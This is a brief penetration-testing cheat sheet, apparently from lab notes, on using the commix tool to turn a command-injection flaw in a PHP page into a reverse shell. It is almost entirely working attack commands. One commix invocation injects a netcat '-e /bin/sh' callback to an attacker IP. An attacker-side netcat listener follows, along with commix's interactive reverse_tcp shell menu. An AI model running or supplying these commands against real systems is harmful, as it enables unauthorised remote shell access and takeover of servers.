Commix Reverse Shell
====================
Technique 1
-----------
```bash
commix -u 'http://10.5.21.4/commandexec/example1.php?ip=127.0.0.1' --os-cmd="/bin/nc.traditional -e /bin/sh 10.5.21.22 1234"
```

Technique 2
-----------
On Attacker
-------------
````bash
nc -lvp 1234
````

On Victim
------------
```bash
os_shell
commix(os_shell)
reverse_tcp
set LHOST attackers.ip.address
set LPORT 1234

---[ Reverse TCP shells ]---     
Type '1' to use a netcat reverse TCP shell.
Type '2' for other reverse TCP shells.

1

---[ Unix-like targets ]--- 
Type '1' to use the default Netcat on target host.
Type '2' to use Netcat for Busybox on target host.
Type '3' to use Netcat-Traditional on target host. 
Type '4' to use Netcat-Openbsd on target host. 

3
```
